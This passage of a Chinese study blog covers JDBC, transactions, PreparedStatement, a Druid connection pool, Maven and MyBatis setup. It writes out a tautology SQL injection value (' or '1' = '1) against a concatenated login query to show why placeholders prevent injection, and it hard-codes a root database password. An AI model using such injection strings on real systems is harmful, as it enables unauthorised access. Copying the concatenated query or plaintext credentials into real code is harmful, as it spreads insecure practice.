class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.itheima.JDBC;<br><br><span class="hljs-keyword">import</span> java.<span class="hljs-keyword">sql</span>.<span class="hljs-keyword">Connection</span>;<br><span class="hljs-keyword">import</span> java.<span class="hljs-keyword">sql</span>.DriverManager;<br><span class="hljs-keyword">import</span> java.<span class="hljs-keyword">sql</span>.ResultSet;<br><span class="hljs-keyword">import</span> java.<span class="hljs-keyword">sql</span>.<span class="hljs-keyword">Statement</span>;<br><br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> demo &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        //<span class="hljs-number">1.</span>注册驱动<br>        String driver = &quot;com.mysql.cj.jdbc.Driver&quot;;<br>        <span class="hljs-keyword">Class</span>.forName(driver);<br><br>        //<span class="hljs-number">2.</span>获取链接<br>        String url = &quot;jdbc:mysql://127.0.0.1:3306/db1&quot;;<br>        String username = &quot;root&quot;;<br>        String <span class="hljs-keyword">password</span> = &quot;ztdgz947&quot;;<br>        <span class="hljs-keyword">Connection</span> conn = DriverManager.getConnection(url,username,<span class="hljs-keyword">password</span>);<br><br>        //<span class="hljs-number">3.</span>定义<span class="hljs-keyword">sql</span>语句<br>        String <span class="hljs-keyword">sql</span> = &quot;select * from school&quot;;<br><br>        //<span class="hljs-number">4.</span>获取<span class="hljs-keyword">sql</span>对象<br>        <span class="hljs-keyword">Statement</span> stmt = conn.createStatement();<br><br>        //<span class="hljs-number">5.</span>执行<span class="hljs-keyword">sql</span><br>        ResultSet result = stmt.executeQuery(<span class="hljs-keyword">sql</span>);<br><br>        //<span class="hljs-number">6.</span>处理结果<br>        <span class="hljs-keyword">while</span> (result.next())&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(result.getString(<span class="hljs-number">1</span>)+&quot;\t&quot;);<br>        &#125;<br><br>        //<span class="hljs-number">7.</span>释放资源<br>        stmt.<span class="hljs-keyword">close</span>();<br>        conn.<span class="hljs-keyword">close</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>主要步骤是7步，最后我们执行可能会出现</p><p>1.driver驱动的问题：我们就修改驱动</p><p>2.中文乱码问题，我们进入file-&gt;setting-&gt;file encodings中把规范改为GBK</p><h2 id="4-API详解"><a href="#4-API详解" class="headerlink" title="4.API详解"></a>4.API详解</h2><h3 id="1-DriverManager"><a href="#1-DriverManager" class="headerlink" title="1.DriverManager"></a>1.DriverManager</h3><p>DriverManager用于注册我们的Driver驱动，在上面的forname源码中，其实就用到了我们的DriverManager方法</p><h3 id="2-Connection"><a href="#2-Connection" class="headerlink" title="2.Connection"></a>2.Connection</h3><p>作用：</p><p>1.获取执行sql的对象</p><p>普通执行对象：<code>Statement createStatement()</code></p><p>预编译sql的执行sql对象：防止sql注入：<code>PreparedStatement(sql)</code></p><p>执行存储过程对象：<code>CallableStatement prepareCall(sql)</code></p><p>2.事务管理</p><p>mysql的事务管理：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">开启事务：<span class="hljs-keyword">BEGIN</span>;/<span class="hljs-keyword">START</span> <span class="hljs-keyword">TRANSACTION</span>;<br>提交事务：<span class="hljs-keyword">COMMIT</span>;<br>回滚事务：<span class="hljs-keyword">ROLLBACK</span>;<br><br>MySQL默认自动提交事务<br></code></pre></td></tr></table></figure><p>JDBC事务管理：Connection接口中定义了三个对应的方法</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl">开启事务：<span class="hljs-function"><span class="hljs-title">setAutoCommit</span>(<span class="hljs-variable">boolean</span> <span class="hljs-variable">autoCommit</span>):<span class="hljs-variable"><span class="hljs-literal">true</span></span>为自动提交事务；<span class="hljs-variable"><span class="hljs-literal">false</span></span>为手动提交</span><br><span class="hljs-function">提交事务：<span class="hljs-title">commit</span>()</span><br>回滚事务：<span class="hljs-function"><span class="hljs-title">rollback</span>()</span><br></code></pre></td></tr></table></figure><p>对应到我们的代码中：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">//开启事务</span><br>    conn.set<span class="hljs-constructor">AutoCommit(<span class="hljs-params">false</span>)</span>;<br>    <span class="hljs-comment">//5.执行sql</span><br>    ResultSet result1 = stmt.execute<span class="hljs-constructor">Query(<span class="hljs-params">sql1</span>)</span>;<br><br>    <span class="hljs-comment">//6.处理结果</span><br>    <span class="hljs-keyword">while</span> (result1.next<span class="hljs-literal">()</span>)&#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(result1.get<span class="hljs-constructor">String(1)</span>+<span class="hljs-string">&quot;\t&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//执行第二个sql语句需要放在第一个sql语句执行完成之后</span><br>    <span class="hljs-built_in">int</span> count = stmt.execute<span class="hljs-constructor">Update(<span class="hljs-params">sql2</span>)</span>;<br>    <span class="hljs-comment">//处理结果</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(count);<br>    <span class="hljs-comment">//提交事务</span><br>    conn.commit<span class="hljs-literal">()</span>;<br>&#125; catch (Exception throwables) &#123;<br>    <span class="hljs-comment">//失败则回滚事务</span><br>    conn.rollback<span class="hljs-literal">()</span>;<br>    throwables.print<span class="hljs-constructor">StackTrace()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们使用try-catch包裹代码，在try的开始加入开启事务代码，在最后加入提交事务代码</p><p>在失败后回滚事务</p><h3 id="5-Statement"><a href="#5-Statement" class="headerlink" title="5.Statement"></a>5.Statement</h3><p>Statement只有一个作用——那就是执行sql语句</p><h4 id="1-executeUpdate"><a href="#1-executeUpdate" class="headerlink" title="1. executeUpdate"></a>1. executeUpdate</h4><p>这个语句可以实现数据库的增删改查工作，也可以实现新建数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//<span class="hljs-number">3.</span>定义<span class="hljs-keyword">sql</span>语句<br>String <span class="hljs-keyword">sql</span> = &quot;update school set sex = &#x27;female&#x27;&quot;;<br><br>//<span class="hljs-number">4.</span>获取<span class="hljs-keyword">sql</span>对象<br><span class="hljs-keyword">Statement</span> stmt = conn.createStatement();<br><br>//<span class="hljs-number">5.</span>执行<span class="hljs-keyword">sql</span><br><span class="hljs-type">int</span> count = stmt.executeUpdate(<span class="hljs-keyword">sql</span>);<br></code></pre></td></tr></table></figure><p>count是数据库中被影响数据的个数</p><h4 id="2-executeQuery"><a href="#2-executeQuery" class="headerlink" title="2.executeQuery"></a>2.executeQuery</h4><p>查询语句就需要使用executeQuery</p><p>但是它执行结果处理不一样，首先执行结果是使用ResultSet类型接收</p><p>如果下一行有效，就打印出来</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//5.执行sql</span><br>ResultSet result = stmt.execute<span class="hljs-constructor">Query(<span class="hljs-params">sql</span>)</span>;<br><br><span class="hljs-comment">//6.处理结果</span><br><span class="hljs-keyword">while</span> (result.next<span class="hljs-literal">()</span>)&#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(result.get<span class="hljs-constructor">String(1)</span>+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-PreparedStatement"><a href="#6-PreparedStatement" class="headerlink" title="6.PreparedStatement"></a>6.PreparedStatement</h3><p><code>PreparedStatement</code>用于防止我们的sql注入</p><p>比如我们的登录模块</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">String <span class="hljs-type">name</span> = &quot;whr&quot;;<br>String pwd = &quot;&#x27; or &#x27;1&#x27; = &#x27;1&quot;;<br><br>//<span class="hljs-number">3.</span>定义<span class="hljs-keyword">sql</span>语句<br>String <span class="hljs-keyword">sql</span> = &quot;select * from school where name= &#x27;&quot;+<span class="hljs-type">name</span>+&quot;&#x27; and pwd= &#x27;&quot;+pwd+&quot;&#x27;&quot;;<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">sql</span>);<br></code></pre></td></tr></table></figure><p>如果sql查询成功，我们就登入成功</p><p>而此时的sql语句是这个样子的，where会得到一个永真的结果，从而查询所有数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> school <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>= <span class="hljs-string">&#x27;shdfoi&#x27;</span> <span class="hljs-keyword">and</span> pwd= <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p>所以我们需要使用我们的<code>PreparedStatement</code>，<strong>参数使用占位符进行替代</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//用户登录</span><br>String name = <span class="hljs-string">&quot;whr&quot;</span>;<br>String pwd = <span class="hljs-string">&quot;1230&quot;</span>;<br><br><span class="hljs-comment">//3.定义sql语句</span><br>String sql = <span class="hljs-string">&quot;select * from school where name= ? and pwd= ?&quot;</span>;<br><br><span class="hljs-comment">//获取sql对象</span><br>PreparedStatement pstmt = conn.prepare<span class="hljs-constructor">Statement(<span class="hljs-params">sql</span>)</span>;<br><br><span class="hljs-comment">//设置？的值</span><br>pstmt.set<span class="hljs-constructor">String(1,<span class="hljs-params">name</span>)</span>;<br>pstmt.set<span class="hljs-constructor">String(2,<span class="hljs-params">pwd</span>)</span>;<br><br><span class="hljs-comment">//5.执行sql</span><br>ResultSet rs = pstmt.execute<span class="hljs-constructor">Query()</span>;<br><br><span class="hljs-comment">//6.处理结果</span><br><span class="hljs-keyword">if</span> (rs.next<span class="hljs-literal">()</span>)&#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;login success&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;login defeat&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就让我们的sql注入失败了，原理其实是对我们语句中的引号和关键字进行了转义，转义之后的语句便不能匹配所有数据了。</p><p>我们还可以开启预编译sql，使得我们的代码性能更高，使用方法是在url后面加入参数</p><p><code>String url = &quot;jdbc:mysql:///db1?useServerPrepStmts=true&quot;;</code></p><h3 id="7-数据库连接池"><a href="#7-数据库连接池" class="headerlink" title="7.数据库连接池"></a>7.数据库连接池</h3><p><img src="https://s2.loli.net/2022/07/14/oGzSLQm71uMYsvJ.png" alt="数据库连接池.png"></p><p>数据库连接池的接口dataSource</p><p>我们使用的数据库连接池是Druid（德鲁伊）</p><p>下载Druid的jar包放在lib中，然后<code>add as lib</code></p><p>然后我们需要在src下新建一个配置文件<code>druid.properties</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">driverClassName = com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.Driver</span><br>url = jdbc:mysql:<span class="hljs-comment">///db1</span><br>username = root<br>password = ztdgz947<br><span class="hljs-comment">//初始化连接数量</span><br>initalSize = <span class="hljs-number">5</span><br><span class="hljs-comment">//最大连接数</span><br>maxAcitve=<span class="hljs-number">10</span><br><span class="hljs-comment">//最大等待时间</span><br>maxWait=<span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><p>然后写jdbc，注意写<code>prop.load(new FileInputStream(&quot;src/druid.properties&quot;));</code>的时候要注意路径，最好先用<code>System.getProperty(&quot;user.dir&quot;)</code>查看自己的路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.JDBC;<br><br><span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;<br><br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo_Druid</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//1.导入jar</span><br><br>        <span class="hljs-comment">//2.定义配置文件</span><br><br>        <span class="hljs-comment">//3.加载配置文件</span><br>        Properties prop = <span class="hljs-keyword">new</span> Properties();<br>        prop.load(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src/druid.properties&quot;</span>));<br>        <span class="hljs-comment">//4.获取对象</span><br>        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);<br>        <span class="hljs-comment">//5.获取链接</span><br>        Connection connection = dataSource.getConnection();<br>        System.out.println(connection);<br><span class="hljs-comment">//        System.out.println(System.getProperty(&quot;user.dir&quot;)); 用于查看当前路径</span><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功执行的控制台是： 代表连接池中的链接少了一个用于我们的链接</p><p><img src="https://s2.loli.net/2022/09/04/ibVzF2LxdKYEOX6.png" alt="druid.png"></p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p>用于构建和管理java项目</p><p>标准化了项目结构，实现多平台运行</p><p><img src="https://s2.loli.net/2022/09/04/XZ2tYnrzFHap7iV.png" alt="maven.png"></p><p>提供一套的依赖管理（jar包等）之前是下载jar，然后加入工作环境</p><p>现在maven只需要写几行代码就可以导入</p><p><img src="https://s2.loli.net/2022/09/04/K83zcaeDJijWgVm.png" alt="maven导入jar包.png"></p><h2 id="1-安装mvn"><a href="#1-安装mvn" class="headerlink" title="1.安装mvn"></a>1.安装mvn</h2><p>安装maven的话参考这个</p><p><img src="https://s2.loli.net/2022/09/04/qGCzBVeUb12pM8m.png" alt="maven配置.png"></p><h2 id="2-mvn命令"><a href="#2-mvn命令" class="headerlink" title="2.mvn命令"></a>2.mvn命令</h2><p>编译在pom.xml处打开控制台</p><p>输入：<code>mvn compile</code></p><p>运行后，开始下载项目所需的依赖，之后生成一个target文件</p><p><code>mvn clean</code> 就会清理掉<code>target</code>文件</p><p><code>mvn package</code>会打包生成target目录，然后里面会有一个打包的jar，里面是我们的字节码文件</p><p><code>mvn test</code>会执行我们的test代码</p><p><code>mvn install</code>会将我们项目打包成jar包并放入本地仓库</p><h2 id="3-maven项目"><a href="#3-maven项目" class="headerlink" title="3.maven项目"></a>3.maven项目</h2><p><img src="https://s2.loli.net/2022/09/04/ZkKvceTqzp5sNt4.png" alt="idea创建maven.png"></p><h3 id="1-新建maven项目"><a href="#1-新建maven项目" class="headerlink" title="1.新建maven项目"></a>1.新建maven项目</h3><p>在新建中寻找module，然后选择maven项目</p><p>创建成功后的文件夹中有src文件夹和pom.xml配置文件</p><p>编译的时候我们需要注意maven的sdk版本和我们使用的sdk版本是否一样，在project中和setting中查看</p><p>或者在pom.xml中加入代码：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-symbol">&lt;properties&gt;</span><br>    &lt;maven.<span class="hljs-keyword">compiler</span>.<span class="hljs-keyword">source</span>&gt;<span class="hljs-number">8</span>&lt;/maven.<span class="hljs-keyword">compiler</span>.<span class="hljs-keyword">source</span>&gt;<br>    &lt;maven.<span class="hljs-keyword">compiler</span>.target&gt;<span class="hljs-number">8</span>&lt;/maven.<span class="hljs-keyword">compiler</span>.target&gt;<br>&lt;/properties&gt;<br></code></pre></td></tr></table></figure><h3 id="2-导入jar包"><a href="#2-导入jar包" class="headerlink" title="2.导入jar包"></a>2.导入jar包</h3><p>本地仓库有的jar包可以按住<code>alt+fn+insert</code>打开仓库进行搜索导入</p><p>仓库没有的jar包我们就正常填写，填写了之后会自动帮我们下载</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--导入依赖包--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.29<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还有一个<code>&lt;scope&gt;</code>标签选择我们jar包的作用环境</p><p><img src="https://s2.loli.net/2022/09/04/dLuCGweEtv1UMoy.png" alt="idea配置maven.png"></p><h1 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h1><h2 id="1-mybatis简介"><a href="#1-mybatis简介" class="headerlink" title="1.mybatis简介"></a>1.mybatis简介</h2><p>mybatis简化了jdbc的开发，作用于持久层</p><p>javaEE的三层框架：表现层就是页面显示，业务层是逻辑处理，持久层就是数据保存到数据库</p><p><img src="https://s2.loli.net/2022/09/04/rlstNLpg5ZbjeqB.png" alt="mybatis.png"></p><h2 id="2-mybatis快速入门"><a href="#2-mybatis快速入门" class="headerlink" title="2.mybatis快速入门"></a>2.mybatis快速入门</h2><p>mybatis的相关jar我们通过maven安装，以下就下载了mysql，mybatis，Junit(单元测试使用)，logback（日志文件配置）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs xml">    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--导入mybatis--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.46<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        junit单元测试--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--        添加日志api--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ch.qos.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logback-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ch.qos.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logback-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>安装之后在main文件夹的resource下写入sql语句的映射文件，<code>mybatis-config.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br>        <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><br><span class="hljs-meta">                <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">                <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql:///mybatis?useSSL = false&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span 